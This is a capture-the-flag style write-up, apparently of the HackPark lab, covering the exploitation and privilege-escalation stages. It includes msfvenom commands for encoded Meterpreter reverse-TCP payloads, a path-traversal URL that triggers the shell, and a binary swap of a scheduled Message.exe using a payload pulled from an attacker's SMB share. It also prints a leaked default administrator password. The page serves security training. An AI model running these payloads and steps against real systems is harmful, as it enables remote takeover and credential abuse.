---
sidebar_position: 3
---

# Exploitation


- Generating the **PAYLOAD** with <b style={{ color: 'IndianRed' }}>MSFVenom</b> after that we can Upload it to the **BlogEngine.**
- Executing the Shell: `http://10.10.76.79/?theme=../../App_Data/files`

```log
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.20.30 LPORT=5555 -f exe -o Rev_Shell.exe
```

<br/>

- <b style={{ color: 'HotPink' }}>Using:</b> <span style={{fontWeight: 'Bold'}}>exploit/multi/handler</span>
- <b style={{ color: 'HotPink' }}>PAYLOAD:</b> <span style={{fontWeight: 'Bold'}}>windows/meterpreter/reverse_tcp</span>

```log
Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.20.30      yes       The listen address (an interface may be specified)
   LPORT     5555             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


[*] Started reverse TCP handler on 10.10.20.30:5555 
[*] Sending stage (175686 bytes) to 10.10.76.79
[*] Meterpreter session 1 opened (10.10.20.30:5555 -> 10.10.76.79:49225) at 2022-10-10 06:29:06 +0200
```

- **We are Logged as:** <b style={{ color: 'LightSeaGreen' }}>IIS APPPOOL\Blog</b> 

```log
meterpreter > getuid 
Server username: IIS APPPOOL\Blog
meterpreter > sysinfo
Computer        : HACKPARK
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > shell
```

<br/>
<br/>


- Enumerating with `WinPeass` we find an Unusual Service on the System `WService.exe`
- We have **Write** Permissions on the Folder of the Service.

```log
================================================================================================================================
WindowsScheduler(Splinterware Software Solutions - System Scheduler Service)[C:\PROGRA~2\SYSTEM~1\WService.exe] - Auto - Running
File Permissions: Everyone [WriteData/CreateFiles]
// highlight-next-line
Possible DLL Hijacking in binary folder: C:\Program Files (x86)\SystemScheduler (Everyone [WriteDataCreateFiles])
System Scheduler Service Wrapper
================================================================================================================================
```


<br/>

<br/>


- There is an Unusual Process Running `Message.exe` that belongs to <b style={{ color: 'DeepSkyBlue' }}>WindowsScheduler</b> 
- We can Replace `Message.exe` with a Reverse Shell to gain Better Permissions on the Machine.


```log
C:\Windows\Temp> tasklist /v
Image Name        PID   Session Name   Session#   Mem Usage
===========       ===== ============   ========   =========  
[..]
Message.exe       2472                        1      7,180K
[..]
C:\Windows\Temp> where /r C:\ Message.exe
File Location: 'C:\Program Files (x86)\SystemScheduler\Message.exe'

C:\Windows\Temp> cd "C:\Program Files (x86)\SystemScheduler"
C:\Program Files (x86)\SystemScheduler> dir
[..]
10/09/2022  09:30 PM    <DIR>          Events
03/25/2018  10:58 AM           536,992 Message.exe
[..]
C:\Program Files (x86)\SystemScheduler>cd Events
C:\Program Files (x86)\SystemScheduler\Events> dir
[..]
10/09/2022  09:31 PM            19,321 20198415519.INI_LOG.txt
[..]
C:\Program Files (x86)\SystemScheduler\Events> type 20198415519.INI_LOG.txt
08/04/19 15:06:01,Event Started Ok, (Administrator)
08/04/19 15:06:30,Process Ended. PID:2608,ExitCode:1,Message.exe (Administrator)
```

<br/>

- Generating the **PAYLOAD** that will Replace `Message.exe`

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.20.30 LPORT=7777 -f exe -o Message.exe
```

- We can Transfer the **PAYLOAD** to the Machine using a Simple `SMB` Server.
```
attacker@machine:~$ mkdir /mnt/SMBShare
attacker@machine:~$ smbserver LINUXSHARE /mnt/SMBShare
```

```
C:\Program Files (x86)\SystemScheduler\Events> cd ..
C:\Program Files (x86)\SystemScheduler> copy \\10.10.20.30\LINUXSHARE\Message.exe Message.exe
Overwrite Message.exe? (Yes/No/All): Yes
        1 file(s) copied.
```


<br/>



- <b style={{ color: 'HotPink' }}>Using:</b> <span style={{fontWeight: 'Bold'}}>exploit/multi/handler</span>
- <b style={{ color: 'HotPink' }}>PAYLOAD:</b> <span style={{fontWeight: 'Bold'}}>windows/meterpreter/reverse_tcp</span>
- After replacing the `Message.exe` Binary we get a Reverse Shell.

```log
Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.20.30      yes       The listen address (an interface may be specified)
   LPORT     7777             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

[*] Started reverse TCP handler on 10.10.20.30:7777 
[*] Sending stage (175686 bytes) to 10.10.76.79
[*] Meterpreter session 1 opened (10.10.20.30:7777 -> 10.10.76.79:49237) at 2022-10-10 06:36:13 +0200
```


- We have **Administrator Rights:** <b style={{ color: 'Red' }}>HACKPARK\Administrator</b>

```log
meterpreter > getuid 
Server username: HACKPARK\Administrator
meterpreter > sysinfo 
Computer        : HACKPARK
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```

---

<br/>

## OTHER [WinPEAS]


- Found Default <b style={{ color: 'Red' }}>Administrator</b> Credentials during an Enumeration with **WinPEAS.**
- The Credentials can be used to Access the `RDP (Remote Desktop Protocol).`

```
DefaultUserName  :  administrator
DefaultPassword  :  4q6XvFES7Fdxs
```